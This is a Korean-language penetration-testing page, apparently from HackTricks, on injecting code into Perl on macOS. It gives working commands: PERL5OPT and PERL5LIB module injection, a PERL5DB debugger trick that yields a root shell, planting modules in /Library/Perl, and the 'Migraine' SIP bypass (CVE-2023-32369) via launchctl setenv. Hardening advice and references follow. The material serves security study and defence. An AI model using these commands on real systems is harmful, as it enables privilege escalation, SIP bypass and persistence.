# macOS Perl Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## Via `PERL5OPT` & `PERL5LIB` env variable

env variable **`PERL5OPT`**를 사용하면 interpreter가 시작될 때 **Perl**이 arbitrary commands를 execute하도록 만들 수 있습니다(대상 script의 첫 번째 줄이 parsed되기 전에도 실행됩니다).
예를 들어, 다음 script를 생성합니다:
```perl:test.pl
#!/usr/bin/perl
print "Hello from the Perl script!\n";
```
이제 **환경 변수를 export**하고 **perl** script를 실행합니다:
```bash
export PERL5OPT='-Mwarnings;system("whoami")'
perl test.pl # This will execute "whoami"
```
또 다른 방법은 Perl module을 생성하는 것입니다(예: `/tmp/pmod.pm`):
```perl:/tmp/pmod.pm
#!/usr/bin/perl
package pmod;
system('whoami');
1; # Modules must return a true value
```
그런 다음 env 변수를 사용하여 모듈이 자동으로 검색되고 로드되도록 합니다:
```bash
PERL5LIB=/tmp/ PERL5OPT=-Mpmod perl victim.pl
```
### 기타 흥미로운 environment variables

* **`PERL5DB`** – interpreter가 **`-d`** (debugger) flag와 함께 시작되면, `PERL5DB`의 내용이 debugger context *내부에서* Perl code로 실행됩니다.
privileged Perl process의 environment와 command-line flags를 모두 제어할 수 있다면 다음과 같이 할 수 있습니다:

```bash
export PERL5DB='system("/bin/zsh")'
sudo perl -d /usr/bin/some_admin_script.pl   # will drop a shell before executing the script
```

* **`PERL5SHELL`** – Windows에서 이 variable은 Perl이 shell을 spawn해야 할 때 사용할 shell executable을 제어합니다. macOS와는 관련이 없으므로 여기서는 완전성을 위해서만 언급합니다.

`PERL5DB`에는 `-d` switch가 필요하지만, verbose troubleshooting을 위해 이 flag를 활성화한 상태로 *root* 권한으로 실행되는 maintenance 또는 installer script를 흔히 찾을 수 있으므로, 이 variable은 유효한 escalation vector가 됩니다.

## dependencies를 통한 (@INC abuse)

Perl이 검색할 include path (**`@INC`**)는 다음을 실행하여 나열할 수 있습니다:
```bash
perl -e 'print join("\n", @INC)'
```
macOS 13/14에서 일반적인 출력은 다음과 같습니다:
```bash
/Library/Perl/5.30/darwin-thread-multi-2level
/Library/Perl/5.30
/Network/Library/Perl/5.30/darwin-thread-multi-2level
/Network/Library/Perl/5.30
/Library/Perl/Updates/5.30.3
/System/Library/Perl/5.30/darwin-thread-multi-2level
/System/Library/Perl/5.30
/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
/System/Library/Perl/Extras/5.30
```
반환된 폴더 중 일부는 실제로 존재하지도 않지만, **`/Library/Perl/5.30`**은 실제로 존재하며 SIP의 보호를 받지 않고 SIP로 보호되는 폴더보다 앞에 있습니다. 따라서 *root* 권한으로 쓸 수 있다면 악성 module(예: `File/Basename.pm`)을 배치하여 해당 module을 import하는 모든 privileged script가 이를 *우선적으로* load하도록 만들 수 있습니다.

> [!WARNING]
> `/Library/Perl` 내부에 쓰려면 여전히 **root** 권한이 필요하며, macOS는 쓰기 작업을 수행하는 process에 *Full Disk Access*를 요청하는 **TCC** prompt를 표시합니다.

예를 들어 script가 **`use File::Basename;`**을 import하는 경우, attacker-controlled code가 포함된 `/Library/Perl/5.30/File/Basename.pm`을 생성할 수 있습니다.

## Migration Assistant를 통한 SIP bypass (CVE-2023-32369 “Migraine”)

2023년 5월 Microsoft는 **CVE-2023-32369**를 공개했습니다. 별칭이 **Migraine**인 이 post-exploitation technique은 *root* attacker가 **System Integrity Protection (SIP)**을 완전히 **bypass**할 수 있도록 합니다.  
취약한 component는 **`systemmigrationd`**이며, **`com.apple.rootless.install.heritable`** entitlement가 부여된 daemon입니다. 이 daemon이 spawn하는 모든 child process는 해당 entitlement를 상속하므로 SIP restriction의 적용을 받지 않고 실행됩니다.<sup>[1]</sup>

researcher들이 식별한 child 중에는 Apple-signed interpreter도 있습니다:<sup>[1]</sup>
```
/usr/bin/perl /usr/libexec/migrateLocalKDC …
```
Perl은 `PERL5OPT`를 따르고(Bash는 `BASH_ENV`를 따름), 데몬의 *환경*을 오염시키는 것만으로도 SIP가 없는 컨텍스트에서 임의 코드 실행을 얻을 수 있습니다:<sup>[1][2]</sup>
```bash
# As root
launchctl setenv PERL5OPT '-Mwarnings;system("/private/tmp/migraine.sh")'

# Trigger a migration (or just wait – systemmigrationd will eventually spawn perl)
open -a "Migration Assistant.app"   # or programmatically invoke /System/Library/PrivateFrameworks/SystemMigration.framework/Resources/MigrationUtility
```
`migrateLocalKDC`가 실행되면 `/usr/bin/perl`은 악성 `PERL5OPT`로 시작하고 *SIP가 다시 활성화되기 전에* `/private/tmp/migraine.sh`를 실행합니다. 해당 스크립트에서 예를 들어 payload를 **`/System/Library/LaunchDaemons`** 내부에 복사하거나, `com.apple.rootless` extended attribute를 할당하여 파일을 **삭제할 수 없게** 만들 수 있습니다.

Apple은 macOS **Ventura 13.4**, **Monterey 12.6.6**, **Big Sur 11.7.7**에서 이 문제를 수정했지만, 이전 버전 또는 패치되지 않은 시스템은 여전히 exploit이 가능합니다.<sup>[1]</sup>

## Hardening 권장 사항

1. **위험한 변수 제거** – privileged launchdaemons 또는 cron jobs는 깨끗한 환경에서 시작해야 합니다(`launchctl unsetenv PERL5OPT`, `env -i` 등).
2. **interpreter를 root로 실행하지 않기** – 반드시 필요한 경우가 아니라면 interpreter를 root로 실행하지 마세요. compiled binaries를 사용하거나 초기에 privileges를 drop하세요.
3. **`-T` (taint mode)를 사용하여 vendor scripts 실행** – taint checking이 활성화되면 Perl은 `PERL5OPT` 및 기타 unsafe switches를 무시합니다.
4. **macOS를 최신 상태로 유지** – “Migraine”은 최신 releases에서 완전히 patch되었습니다.

## References

- [1] [Microsoft Security Blog – System Integrity Protection을 우회할 수 있는 새로운 macOS vulnerability Migraine (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [2] [Hackyboiz – macOS: Part1 - SIP Bypass](https://hackyboiz.github.io/2025/05/11/clalxk/MacOS_SIP-Bypass_en/)

{{#include ../../../banners/hacktricks-training.md}}
